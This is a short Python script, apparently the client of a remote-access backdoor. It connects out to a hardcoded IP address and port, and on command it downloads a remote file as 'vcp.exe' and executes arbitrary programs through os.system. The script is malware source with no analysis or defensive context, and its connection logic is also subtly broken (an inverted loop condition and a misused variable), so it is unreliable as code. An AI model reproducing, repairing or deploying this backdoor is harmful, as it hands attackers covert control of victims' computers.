import socket
import requests
import os

connected = False

HOST = "193.161.193.99"
PORT = 31353

def main():
    while not connected == False:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            connected = True
        except Exception as e:
            print(f"Error while connecting: {e}")
    
    s.send("Connected!".encode())

    while True:
        command = s.recv(4096).decode()
        if command.startswith("https"):
            status = requests.get(command)
            if status.status_code == 200:
                content = status.content
                with open ("vcp.exe", "wb") as f:
                    f.write(content)
        
        elif command.startswith("exec"):
            parts = command.split(" ", 1)

            os.system(f"start {parts[1]}")

if __name__ == "__main__":
    main()